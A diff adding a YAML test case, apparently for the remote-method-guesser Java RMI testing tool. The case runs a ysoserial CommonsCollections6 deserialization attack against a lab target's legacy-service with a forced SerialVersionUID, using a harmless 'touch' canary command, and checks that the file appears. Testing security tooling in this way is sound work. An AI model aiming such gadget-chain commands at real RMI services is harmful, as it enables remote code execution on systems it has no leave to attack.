@@ -195,3 +195,40 @@ tests:
       - file_exists:
           invert:
             - '${volume}/${file}'
+
+
+  - title: Gadget Call (Legacy, non default SerialVersionUID)
+    description: |-
+      'Performs a deserialization attack on the releaseRecord function of the
+      legacy-service object and uses a non default SerialVersionUID for the
+      attack. rmg should autocorrect this.'
+
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+      - --signature
+      - 'void releaseRecord(int recordID, String tableName, Integer remoteHashCode)'
+      - --bound-name
+      - legacy-service
+      - --serial-version-uid
+      - 4444
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - java.lang.Integer
+            - Caught ClassNotFoundException
+            - deserialize canary
+            - probably worked
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
